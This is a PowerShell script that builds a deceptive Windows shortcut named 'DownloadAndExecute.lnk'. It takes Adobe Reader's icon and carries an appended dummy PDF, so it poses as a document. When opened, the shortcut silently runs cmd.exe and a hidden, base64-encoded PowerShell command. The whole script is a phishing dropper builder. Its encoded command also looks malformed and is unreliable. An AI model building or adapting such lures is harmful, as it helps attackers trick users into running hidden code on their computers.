# Get the directory where the .ps1 script is located
$scriptDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent

# Define the path for the LNK file
$lnkPath = Join-Path -Path $scriptDir -ChildPath "DownloadAndExecute.lnk"

# Define the path for the dummy PDF file
$dummyPDFPath = Join-Path -Path $scriptDir -ChildPath "dummy.pdf"

# Define the path for the target executable
$targetPath = "C:\Windows\System32\cmd.exe"

# Define the arguments for the command to be run
# Use double quotes to encapsulate the entire command and escape inner quotes
$arguments = "/c powershell -WindowStyle Hidden -EncodedCommand LwAvYyBwB3BvdwBvAHIAYwBzAGgAbwB2AGUAcwBoAGUAbABsACAAUABhAHcBzABzAFQAUgBzAFIAUABhAHkAYQBsAG8AYQBkAFwAYwByAGUAbABsAG8AZQAuAHMAdAB1AHAAaABjAGUAcwAuAGUAbgB2AEBUAE0AUABhAFAAYQB5AGwAbwBhAGQAXABnAGkAdABoAHUAYgAuAGUAZQBtAFwAIAAiAEIAYgBzAG8AdAAiAA=="

# Define the path for the icon
$iconPath = "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"
$iconIndex = 0  # Usually, the first icon is the one we want

# Create a dummy PDF content
$dummyPDFContent = @"
%PDF-1.5
%¢¯¡À¡Ë©­
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
%%EOF
"@

# Save the dummy PDF content to a file
Set-Content -Path $dummyPDFPath -Value $dummyPDFContent -Encoding Ascii

# Create a new COM object to handle LNK files
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# Set the properties for the shortcut
$shortcut.TargetPath = $targetPath
$shortcut.Arguments = $arguments
$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($targetPath)
$shortcut.IconLocation = "$iconPath,$iconIndex"
$shortcut.Save()

# Embed the PDF content into the LNK file
$pdfContent = [System.IO.File]::ReadAllBytes($dummyPDFPath)
$stream = [System.IO.File]::Open($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
$stream.Seek(0, [System.IO.SeekOrigin]::End)
$stream.Write($pdfContent, 0, $pdfContent.Length)
$stream.Close()

Write-Host "LNK file 'DownloadAndExecute.lnk' created successfully with Adobe Acrobat Reader icon and embedded PDF content."

# Clean up the dummy PDF file
Remove-Item -Path $dummyPDFPath -Force
